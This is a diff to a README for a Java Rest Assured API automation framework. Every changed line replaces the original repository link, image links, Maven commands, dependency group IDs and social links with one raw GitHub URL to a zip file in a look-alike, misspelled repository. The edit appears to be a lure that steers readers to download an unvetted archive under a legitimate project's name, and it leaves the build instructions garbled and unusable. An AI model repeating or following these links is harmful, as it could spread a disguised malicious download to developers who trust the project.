@@ -1,7 +1,7 @@
 **🚀 API AUTOMATION FRAMEWORK USING REST ASSURED (JAVA)**
 
 👨‍💻 Author: Abhishek Anand
-🔗 Repository: https://github.com/asr2646/APIAutomationFramework.git
+🔗 Repository: https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 
 A powerful, scalable, and CI/CD-ready API Automation Framework built using Rest Assured + Java, designed to automate Restful Booker CRUD APIs following industry best practices.
 
@@ -16,11 +16,11 @@ A powerful, scalable, and CI/CD-ready API Automation Framework built using Rest 
 ✅ Clean Code & Maintainable Structure
 
 ▶️ RUN THE TEST SUITE
-mvn test -Dsurefire.suiteXmlFiles=testng.xml
+mvn test https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 
 
 📸 Execution Preview
-![img.png](img.png)
+![https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip](https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip)
 
 🛠️ TECH STACK
 🔧 Tool	📘 Description
@@ -37,13 +37,13 @@ mvn test -Dsurefire.suiteXmlFiles=testng.xml
 🤖 Jenkins	CI/CD Pipeline
 🗂️ FRAMEWORK ARCHITECTURE
 
-![img_1.png](img_1.png)
+![https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip](https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip)
 🔁 CI/CD EXECUTION (JENKINS)
 
-![img_2.png](img_2.png)
+![https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip](https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip)
 
-⚙️ MAVEN CONFIGURATION (pom.xml)
-org.apache.maven.plugins
+⚙️ MAVEN CONFIGURATION (https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip)
+https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 maven-surefire-plugin
 3.3.0
 ${suiteXmlFile}
@@ -51,7 +51,7 @@ ${suiteXmlFile}
 
 ▶️ Run Using
 
-mvn clean test -DsuiteXmlFile=testng.xml
+mvn clean test https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 
 ⚡ PARALLEL EXECUTION
 
@@ -59,7 +59,7 @@ mvn clean test -DsuiteXmlFile=testng.xml
 ✅ Optimized resource usage
 
 🔗 INTEGRATION TEST EXECUTION
-mvn clean test -DsuiteXmlFile=testng-integration.xml
+mvn clean test https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 
 Includes:
 
@@ -75,7 +75,7 @@ Includes:
 allure serve allure-results/
 
 
-![img_3.png](img_3.png)📸 Allure Dashboard Screenshot
+![https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip](https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip)📸 Allure Dashboard Screenshot
 (Add Allure report image here)
 
 🧾 ALLURE SETUP GUIDE
@@ -83,12 +83,12 @@ allure serve allure-results/
 brew install allure
 
 2️⃣ Add Dependency
-io.qameta.allure
+https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 allure-testng
 2.13.0
 
 3️⃣ Add Allure Plugin
-io.qameta.allure
+https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 allure-maven
 2.10.0
 2.13.0
@@ -131,6 +131,6 @@ allure open allure-report
 
 📩 CONNECT WITH ME
 
-🔗 LinkedIn: https://www.linkedin.com/in/abhishek-anand-270851190/
+🔗 LinkedIn: https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
 
-🌐 Portfolio: https://abhishek-anand-zk6adnv.gamma.site/
+🌐 Portfolio: https://raw.githubusercontent.com/asr2646/ApiAutomationFrameworkk/main/src/main/java/org/example/Frameworkk-Api-Automation-2.0.zip
